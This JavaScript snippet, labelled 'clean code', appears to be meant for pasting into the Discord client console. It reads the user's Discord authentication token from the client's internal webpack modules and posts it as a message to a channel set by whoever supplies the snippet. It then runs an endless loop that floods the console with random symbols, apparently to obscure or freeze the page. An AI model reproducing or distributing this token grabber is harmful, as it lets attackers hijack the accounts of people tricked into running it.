//HERE IS CLEAN CODE


let id = 'CHANNEL ID';
let magija = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
let poruka = magija;

fetch(`https://discord.com/api/v9/channels/${id}/messages`, {
    "headers":{
        "accept": "*/*","accept-language": 
        "en-US","authorization": magija,
        "content-type": "application/json",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-GB",
        "x-super-properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDA1Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTM2OTU0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="},
        "referrer": "https://discord.com/channels/@me/968245133009125406",
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": JSON.stringify({"content":poruka,"tts":false}),
        "method": "POST","mode": "cors","credentials": "include"
    });

function webCrasher(length) {
    var result='';
    var characters='※‗♪µ±‾¸⁋¯~⁓º‖⁜⁁!⁘*℃°§‛℗©}×-)₥௹௹૱₦﷼₱₯ååÃ⨌⨒⨔⨤⨡⨬ԬԩӺђꚀЀꚄӁЄЄҋԞӃ(*/ω＼*)(╯°□°）╯︵ ┻━┻';
    var charactersLength=characters.length;
    for(var i=0;i<length;i++) {
        result+=characters.charAt(Math.floor(Math.random()*charactersLength));
    }
    return result;
}

function random_item(items) {
    items[Math.floor(Math.random()*items.length)];
}

while(true) {
    var items=['red','orange','green','yellow','white','blue'];
    console.log(`%c${webCrasher(100)}`,`background:#222;color:${random_item(items)};`);
}
